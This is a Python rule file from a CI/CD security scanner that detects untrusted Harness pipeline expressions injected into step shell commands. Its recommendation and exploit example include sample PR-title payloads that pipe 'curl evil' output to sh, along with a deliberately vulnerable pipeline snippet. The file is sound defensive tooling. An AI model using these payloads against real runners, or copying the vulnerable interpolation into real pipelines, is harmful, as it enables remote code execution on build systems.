"""HARNESS-002. Untrusted Harness expression interpolated into a step shell."""
from __future__ import annotations

from ...base import Finding, Severity
from ...rule import Rule
from ..base import (
    UNTRUSTED_EXPR_RE,
    HarnessPipeline,
    iter_steps,
    step_command_text,
    step_label,
)

RULE = Rule(
    id="HARNESS-002",
    title="Untrusted Harness expression interpolated into a step command",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4",),
    cwe=("CWE-94", "CWE-78"),
    recommendation=(
        "Never paste an attacker-controllable Harness expression "
        "(``<+codebase.prTitle>``, ``<+codebase.commitMessage>``, a branch "
        "/ tag name, or any ``<+trigger.*>`` / ``<+eventPayload.*>`` value) "
        "straight into a ``Run`` step ``command``. Harness substitutes the "
        "expression's text into the script before the shell runs it, so a "
        "pull request titled ``$(curl evil|sh)`` executes on your runner. "
        "Pass the value through an environment variable instead "
        "(``envVariables: { PR_TITLE: <+codebase.prTitle> }`` then use "
        "``\"$PR_TITLE\"`` quoted in the script), which makes the shell "
        "treat it as data, not code."
    ),
    docs_note=(
        "The Harness analog of GHA-002 / GL-002 script injection. Fires "
        "when a step's ``spec.command`` text contains a ``<+...>`` "
        "expression that resolves to outside-contributor input: the "
        "``codebase`` identity / ref / title / message fields "
        "(``gitUser``, ``branch``, ``sourceBranch``, ``targetBranch``, "
        "``tag``, ``prTitle``, ``commitMessage``, ...) or the whole "
        "``trigger.`` / ``eventPayload.`` webhook context. "
        "``<+codebase.commitSha>`` / ``<+codebase.repoUrl>`` are excluded "
        "(not injectable text). Detection is purely on the expression "
        "namespace, so it does not depend on the trigger type; binding the "
        "value to an env var and quoting it clears the finding."
    ),
    exploit_example=(
        "# Vulnerable: the PR title is pasted into the shell verbatim.\n"
        "# A pull request titled `; curl evil.sh | sh #` runs on the runner.\n"
        "- step:\n"
        "    type: Run\n"
        "    identifier: greet\n"
        "    spec:\n"
        "      shell: Sh\n"
        "      command: echo \"Building <+codebase.prTitle>\"\n"
        "\n"
        "# Safe: bind to an env var and quote it, the shell sees data.\n"
        "- step:\n"
        "    type: Run\n"
        "    identifier: greet\n"
        "    spec:\n"
        "      shell: Sh\n"
        "      envVariables:\n"
        "        PR_TITLE: <+codebase.prTitle>\n"
        "      command: echo \"Building $PR_TITLE\""
    ),
)


def check(pipeline: HarnessPipeline) -> Finding:
    offenders: list[str] = []
    for stage_id, step in iter_steps(pipeline):
        text = step_command_text(step)
        if not text:
            continue
        fields = {m.group("field") for m in UNTRUSTED_EXPR_RE.finditer(text)}
        if fields:
            shown = ", ".join(sorted(fields)[:3])
            offenders.append(f"{step_label(stage_id, step)} (<+{shown}…>)")
    passed = not offenders
    desc = (
        "No step command interpolates an untrusted Harness expression."
        if passed else
        f"{len(offenders)} step command(s) interpolate an "
        f"attacker-controllable Harness expression into the shell: "
        f"{'; '.join(offenders[:5])}"
        f"{'...' if len(offenders) > 5 else ''}."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=pipeline.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
